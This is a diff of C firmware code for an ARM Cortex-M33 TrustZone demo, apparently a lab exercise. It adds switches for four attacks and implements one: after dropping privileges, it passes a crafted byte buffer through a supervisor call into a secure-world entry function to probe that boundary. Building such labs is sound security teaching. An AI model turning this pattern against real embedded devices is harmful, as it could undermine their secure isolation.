@@ -8,6 +8,11 @@
 #include "Board_LED.h"                         /* ::Board Support:LED */
 #include "..\IOTKit_CM33_s\Secure_Functions.h" /* Secure Code Entry Points */
 
+// #define ATTACK1
+#define ATTACK2
+// #define ATTACK3
+// #define ATTACK4
+
 #define DROP_NS_PRIVILEGES __asm("msr CONTROL, %[reg] " ::[reg] "r"(1) \
 : "memory")
 
@@ -16,10 +21,11 @@
 
 void attacker_controlled(void) __attribute__((section("unprivilege_code")));
 void attack_1(void) __attribute__((section("unprivilege_code"), noinline));
-void attack_2(void) __attribute__((section("unprivilege_code")));
+void attack_2(void) __attribute__((section("unprivilege_code"), noinline));
 void attack_3(void);
 void attack_4(void);
 void print_LCD(char *msg);
+void attack_2_svc(char *msg);
 
 char text[] = "Hello World (non-secure)\r\n";
 
@@ -98,6 +104,9 @@ void SVC_Handler_Main(uint32_t exc_return_code, uint32_t msp_val)
         case 1:
             print_LCD_nsc((char *) svc_args[0]);
             break;
+        case 2:
+            attack_2_nsc((char *) svc_args[0]);
+            break;
         default:
             break;
     }
@@ -121,6 +130,15 @@ void print_LCD(char *msg)
     );
 }
 
+void attack_2_svc(char *msg)
+{
+    register char* r0 __asm("r0") = msg;
+    __asm volatile("svc #2"
+        :
+        : "r"  (r0)
+    );
+}
+
 void attacker_controlled(void)
 {   
     LED_On(7u);
@@ -137,7 +155,10 @@ void attack_1(void)
 
 void attack_2(void)
 {
-    
+    DROP_NS_PRIVILEGES;
+    char user_input[28] = {
+        0x00,0x00,0x21,0x00};
+    attack_2_svc(user_input);
 }
 
 static uint32_t x;
@@ -171,7 +192,15 @@ int main(void)
     SystemCoreClockUpdate();
     SysTick->CTRL = 0;
 
+    #ifdef ATTACK1
     attack_1();
+    #elif defined ATTACK2
+    attack_2();
+    #elif defined ATTACK3
+    attack_3();
+    #elif defined ATTACK4
+    attack_4();
+    #endif
     
     LED_On(0u);
     while (1)
